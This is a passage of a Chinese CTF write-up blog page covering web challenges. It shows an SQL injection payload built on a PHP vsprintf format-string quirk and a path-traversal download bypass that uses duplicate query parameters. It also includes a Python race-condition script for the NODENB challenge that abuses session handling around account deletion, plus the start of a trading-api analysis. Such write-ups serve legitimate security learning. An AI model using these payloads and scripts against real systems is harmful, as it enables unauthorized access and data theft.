<p>但是问题不大，因为存在格式化字符串漏洞<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031104724.png" alt="img" style="zoom:67%;"></p>
<p>我们的最终目的应该是构造出万能密码，然后成功登陆即可<br>阅读源码，可以发现%s后面会被替换成’%s’如果我们想成功登录，那么就要闭合前面的引号，逃逸出一个单引号<br>查询语句为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; where password&#x3D;sha1(%s) and name&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure>

<p>如果我们此时仅输入单引号，那么就会被过滤函数给转义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">从&#39;变成\&#39;</span><br></pre></td></tr></table></figure>

<p>因为存在格式化字符串漏洞，我们可以利用这里%会吃字符的特性，吃掉\</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">&quot;name=&#x27;%\&quot;;</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=vsprintf(<span class="subst">$a</span>,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">echo <span class="subst">$b</span>;</span></span><br><span class="line"><span class="string">#name=&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果我们可以在转义之前就插入<code>%&#39;</code>，那么后面转义后就变成<code>%\&#39;</code>，此时在经过vsprintf函数，就会变成只剩下单引号以后的内容<code>&#39;</code>,但此时会引起语法上报错，因为有两个%，但是后面只有一个参数，匹配不上，而在格式化字符串中匹配中没有<code>%1$&#39;</code>这个格式，将会被直接舍弃掉,这个就不会引起报错了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;name=&#x27;%\&#x27;%s&quot;</span>;</span><br><span class="line">$b=vsprintf($a,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">#Warning: vsprintf(): Too few arguments in</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;name=&#x27;%1$\&#x27;%s&quot;</span>;</span><br><span class="line">$b=vsprintf($a,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">#name=&#x27;&#x27;a</span></span><br></pre></td></tr></table></figure>

<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p>来分析一下他代码的执行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#先尝试password&#x3D;1%1$&#39;) or 1&#x3D;1#</span><br><span class="line">则(转义后)变成:</span><br><span class="line">1%$1\&#39;) or 1&#x3D;1#</span><br><span class="line">然后变成</span><br><span class="line">SELECT * FROM &#96;users&#96; where password&#x3D;sha1(&#39;1%1$\&#39;) or 1 &#x3D; 1#&#39;)</span><br><span class="line">此时还需要在经过sprintf才能消去%1$\让单引号逃逸出来，所以还要在post一次name让他在经过一次sprintf，此时即可登录成功</span><br><span class="line">最终payload</span><br><span class="line">password&#x3D;1%1$&#39;) or 1&#x3D;1#&amp;name&#x3D;a</span><br></pre></td></tr></table></figure>

 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104005441.png" alt="img" style="zoom:67%;">

<p>登陆成功以后仅仅只是个开始，再来看看源码，提供了下载功能，意味着我们可以文件下载来读取flag，但是存在一点，我们不知道secret，所以无法伪造那个sha加密，但是我们现在有现成的两个文件，他们有提供这个sha加密的结果<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104111112.png" alt="img" style="zoom:67%;"></p>
<p>但是如果我们直接传入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?h&#x3D;f2d03c27433d3643ff5d20f1409cb013&amp;file_name&#x3D;FlagNotHere.txt&amp;file_name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p>原本的的file_name将会直接被覆盖，就过不去后面的hash比对<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144104.png" alt="img"></p>
<p>所以这里就利用QUERY_STRING传入的不会urldecode，还有在php中空格会自动解析为_的特性把上面的payload改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?h&#x3D;f2d03c27433d3643ff5d20f1409cb013&amp;file_name&#x3D;FlagNotHere.txt&amp;file%20name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p> 此时可以发现，两个检测时值互相不覆盖<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144438.png" alt="img"></p>
<p>而后空格被解析为下划线，当面对两个file_name值的时候，php就会默认选择后者<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144505.png" alt="img"></p>
<p>此时就可以下载得到flag了</p>
<h2 id="NODENB"><a href="#NODENB" class="headerlink" title="NODENB"></a>NODENB</h2><p>注册登录以后，来看看源码，他使用的是redis的数据库，所以命令集都是redis的，并且可以直接调用，但是对于redis的命令都比较陌生，所以要学习一下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> db = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> asyncBinds = [</span><br><span class="line">    <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setnx&#x27;</span>, <span class="string">&#x27;incr&#x27;</span>, <span class="string">&#x27;exists&#x27;</span>, <span class="string">&#x27;del&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;hget&#x27;</span>, <span class="string">&#x27;hset&#x27;</span>, <span class="string">&#x27;hgetall&#x27;</span>, <span class="string">&#x27;hmset&#x27;</span>, <span class="string">&#x27;hexists&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sadd&#x27;</span>, <span class="string">&#x27;srem&#x27;</span>, <span class="string">&#x27;smembers&#x27;</span>, <span class="string">&#x27;sismember&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>主要看看和flag有关的，首先是创了一个用户叫做system，然后这里就是创建了一个note库？然后里面有个flag表，然后他有个字段title叫FLAG，值为FLAG，来自于前面定义的环境变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.hset(<span class="string">&#x27;uid:1&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">db.set(<span class="string">&#x27;user:system&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">db.setnx(<span class="string">&#x27;index:uid&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">db.hmset(<span class="string">&#x27;note:flag&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;Flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: FLAG,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>很明显，需要从这里得到，访问/notes/flag，接下来他会校验id</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/notes/:nid&#x27;</span>, ensureAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; nid &#125; = req.params;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">await</span> db.hasUserNoteAcess(req.session.user.id, nid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/notes&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="keyword">await</span> db.getNote(nid);</span><br><span class="line">    res.render(<span class="string">&#x27;note&#x27;</span>, &#123; note &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这里看一下他是如何进行校验的,第一个比较时肯定可以过的，第二个是比较用户名是否存在于对应的hash表</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> hasUserNoteAcess(uid, nid) &#123;</span><br><span class="line"><span class="comment">//Redis Sismember 命令判断成员元素是否是集合的成员,nid为flag，那一定是，这个是表里有的</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">await</span> db.sismember(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>, nid)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//Hexists 命令用于查看哈希表的指定字段是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">await</span> db.hexists(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, <span class="string">&#x27;hash&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// system user has no password</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>按照上面的逻辑，就是我们要先登录system的账号，然后才可以访问到flag，但是上面又说system是没有密码的，但是这里又需要你的密码是非空且为string，那么这里就是一个矛盾点了，怎么可能让password非空然后又符合空以后加密的hash值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!username || !password || <span class="keyword">typeof</span> username !== <span class="string">&#x27;string&#x27;</span> || <span class="keyword">typeof</span> password !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">       res.flash(<span class="string">&#x27;danger&#x27;</span>, <span class="string">&#x27;invalid username or password&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span> res.status(<span class="number">400</span>).render(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>但其实也不一定要登录，因为他验证的是会话的hash值，所以如果我们可以伪造得到这个会话，也是能达到最终目的,额很明显，伪造是不可能的，再回去看了一下上面的验证逻辑，他验证的函数是hexists，即在这个hash表中有没有这个hash值，如果没有的话，那就是true！那是不是存在当我们删除这个某个用户以后，他的session还在，但是已经没有这个hash值了呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">await</span> db.hexists(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, <span class="string">&#x27;hash&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// system user has no password</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>来看看他删除的过程，这里再贴一下创建的过程会理解的比较清楚一些</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> createUser(name, password) &#123;</span><br><span class="line">       <span class="keyword">const</span> isAvailable = <span class="keyword">await</span> db.setnx(<span class="string">`user:<span class="subst">$&#123;name&#125;</span>`</span>, <span class="string">&#x27;PLACEHOLDER&#x27;</span>);</span><br><span class="line">       <span class="keyword">if</span> (!isAvailable) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;user already exists!&#x27;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">const</span> uid = <span class="keyword">await</span> db.incr(<span class="string">&#x27;index:uid&#x27;</span>);</span><br><span class="line">       <span class="keyword">await</span> db.set(<span class="string">`user:<span class="subst">$&#123;name&#125;</span>`</span>, uid);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">const</span> hash = <span class="keyword">await</span> argon2.hash(password);</span><br><span class="line">       <span class="keyword">await</span> db.hmset(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, &#123; name, hash &#125;);</span><br><span class="line">       <span class="keyword">return</span> uid;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p>对比创建和删除，可以发现，当删除了uid以后，name和对应的hash也会删除，然后session是在后面删除的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> deleteUser(uid) &#123;</span><br><span class="line">        <span class="keyword">const</span> user = <span class="keyword">await</span> helpers.getUser(uid);</span><br><span class="line">        <span class="keyword">await</span> db.set(<span class="string">`user:<span class="subst">$&#123;user.name&#125;</span>`</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">await</span> db.del(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> sessions = <span class="keyword">await</span> db.smembers(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:sessions`</span>);</span><br><span class="line">        <span class="keyword">const</span> notes = <span class="keyword">await</span> db.smembers(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>);</span><br><span class="line">        <span class="keyword">return</span> db.del([</span><br><span class="line">            ...sessions.map(<span class="function">(<span class="params">sid</span>) =&gt;</span> <span class="string">`sess:<span class="subst">$&#123;sid&#125;</span>`</span>),</span><br><span class="line">            ...notes.map(<span class="function">(<span class="params">nid</span>) =&gt;</span> <span class="string">`note:<span class="subst">$&#123;nid&#125;</span>`</span>),</span><br><span class="line">            <span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:sessions`</span>,</span><br><span class="line">            <span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p>而在这个模块中，有延时存在，进入flash以后会对session进行操作，可以理解为暂时替我们保留了一会session</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.query.random) &#123;</span><br><span class="line">        <span class="keyword">const</span> ms = <span class="built_in">Math</span>.floor(<span class="number">2000</span> + <span class="built_in">Math</span>.random() * <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span><br><span class="line">        res.flash(<span class="string">&#x27;info&#x27;</span>, <span class="string">`Our AI ran <span class="subst">$&#123;ms&#125;</span>ms to generate this piece of groundbreaking research.`</span>);</span><br><span class="line">        content = <span class="string">&#x27;Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>创建用户，然后启用延时功能，在删除该用户的同时，使用它的session访问notes/flag表，但是我试了几次都没成功，想着会不会是手速不够快？这里涉及到多进程并行的情况，学习一下这个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">multiprocessing</span>.<span class="title">Process</span>(<span class="params">group=None, target=None, name=None, args=(<span class="params"></span>), kwargs=&#123;&#125;, *, daemon=None</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">start</span>()方法启动，这样创建进程比<span class="title">fork</span>()还要简单。</span></span><br><span class="line"><span class="class"><span class="title">join</span>()方法可以等待子进程结束后再继续往下运行(<span class="params">更准确地说，在当前位置阻塞主进程，带执行join（）的进程结束后再继续执行主进程</span></span></span><br><span class="line"><span class="class"><span class="params"><span class="comment">#这里说一下join方法，比如说有主进程和a和在执行，那么就是主进程执行然后紧跟着a.start()，遇到a.join()就会先阻塞主进程，等到a执行完毕，再执行主进程                       </span></span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://nodenb.flu.xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">u,p</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:u,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:p</span><br><span class="line">    &#125;</span><br><span class="line">    r=s.post(url+<span class="string">&#x27;/register&#x27;</span>,data=data)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">u,p</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:u,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:p</span><br><span class="line">    &#125;</span><br><span class="line">    r=s.post(url+<span class="string">&#x27;/login&#x27;</span>,data=data)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteme</span>():</span></span><br><span class="line">    r=s.post(url+<span class="string">&quot;/deleteme&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    r=s.get(url+<span class="string">&quot;/notes/flag&quot;</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep_notes</span>(<span class="params">title,content,s</span>):</span></span><br><span class="line">    p=<span class="string">&quot;/notes?random=true&quot;</span></span><br><span class="line">    r=s.post(url+p,data=&#123;<span class="string">&#x27;title&#x27;</span>:title,<span class="string">&#x27;content&#x27;</span>:content&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = requests.session()</span><br><span class="line">        u = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">        p = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">        r1=register(u,p)</span><br><span class="line">        l1=login(u,p)</span><br><span class="line">        print(<span class="string">&quot;a&quot;</span>,s.cookies)</span><br><span class="line">        c=s.cookies.get(<span class="string">&quot;connect.sid&quot;</span>)</span><br><span class="line">        p=Process(target=sleep_notes,args=(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,s))</span><br><span class="line">        p.start()</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        d=deleteme()</span><br><span class="line">        p.join()</span><br><span class="line">        s.cookies.update(&#123;<span class="string">&quot;connect.sid&quot;</span>:c&#125;)</span><br><span class="line">        r=get_flag()</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">&quot;flag&quot;</span>,r.text):</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>最后还是没出来。头晕了–</p>
<h2 id="trading-api-High"><a href="#trading-api-High" class="headerlink" title="trading-api(High)"></a>trading-api(High)</h2><p>js文件有点多，从页面入手吧，一开始他说我们没有tooken</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authn</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> authHeader = req.header(<span class="string">&#x27;authorization&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!authHeader) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;missing auth token&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        req.user = jsonwebtoken.verify(authHeader, JWT_SECRET);</span><br><span class="line">        next();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">401</span>).send(<span class="string">&#x27;invalid auth token&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以来看看login的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">async function login(req, res) &#123;</span><br><span class="line">    const &#123; username, password &#125; &#x3D; req.body;</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        return res.status(400).send(&#39;missing username or password&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        const r &#x3D; await got.post(&#96;$&#123;AUTH_SERVICE&#125;&#x2F;api&#x2F;users&#x2F;$&#123;encodeURI(username)&#125;&#x2F;auth&#96;, &#123;</span><br><span class="line">            headers: &#123; authorization: AUTH_API_TOKEN &#125;,</span><br><span class="line">            json: &#123; password &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">        if (r.statusCode !&#x3D;&#x3D; 200) &#123;</span><br><span class="line">            return res.status(401).send(&#39;wrong&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const jwt &#x3D; jsonwebtoken.sign(&#123; username &#125;, JWT_SECRET);</span><br><span class="line">        return res.json(&#123; token: jwt &#125;);</span><br><span class="line">    &#125; catch (error) &#123;</span><br><span class="line">        return res.status(503).end(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>